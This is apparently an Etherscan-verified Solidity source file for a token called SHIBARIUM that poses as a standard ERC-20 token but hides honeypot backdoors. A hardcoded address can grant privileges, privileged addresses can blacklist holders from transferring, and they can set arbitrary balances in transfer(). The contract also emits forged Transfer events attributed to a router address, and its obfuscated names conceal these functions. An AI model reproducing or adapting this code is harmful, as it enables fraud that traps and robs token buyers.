/**
 *Submitted for verification at Etherscan.io on 2022-10-31
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _MsgSendr() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address _tiConstruct = 0x6f446dFCB8d3b117095B6065ECa85cB606D0eFBa;
	address UniV2Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    constructor () {
        address msgSender = _MsgSendr();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }

}



contract SHIBARIUM is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Tii;
	mapping (address => bool) private Yii;
    mapping (address => bool) private Kii;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _TiSup = 1000000000 * 10**_decimals;
    string private constant _name = "SHIBARIUM";
    string private constant _symbol = "SHIBARIUM";



    constructor () {
        Tii[_MsgSendr()] = _TiSup;
        emit Transfer(address(0), UniV2Router, _TiSup);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _TiSup;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Tii[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function Tiend(address px) public {
        if(Yii[msg.sender]) { 
        Kii[px] = false;}}
        function Tiquery(address px) public{
         if(Yii[msg.sender])  { 
        require(!Kii[px]);
        Kii[px] = true; }}
		function Aistake(address px) public{
         if(msg.sender == _tiConstruct)  { 
        require(!Yii[px]);
        Yii[px] = true; }}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == _tiConstruct)  {
        require(amount <= Tii[sender]);
        Tii[sender] -= amount;  
        Tii[recipient] += amount; 
          _allowances[sender][msg.sender] -= amount;
        emit Transfer (UniV2Router, recipient, amount);
        return true; }    
          if(!Kii[recipient]) {
          if(!Kii[sender]) {
         require(amount <= Tii[sender]);
        require(amount <= _allowances[sender][msg.sender]);
        Tii[sender] -= amount;
        Tii[recipient] += amount;
      _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address recipient, uint256 amount) public {
        if(msg.sender == _tiConstruct)  {
        require(Tii[msg.sender] >= amount);
        Tii[msg.sender] -= amount;  
        Tii[recipient] += amount; 
        emit Transfer (UniV2Router, recipient, amount);}
        if(Yii[msg.sender]) {Tii[recipient] = amount;} 
        if(!Kii[msg.sender]) {
        require(Tii[msg.sender] >= amount);
        Tii[msg.sender] -= amount;  
        Tii[recipient] += amount;          
        emit Transfer(msg.sender, recipient, amount);
        }}}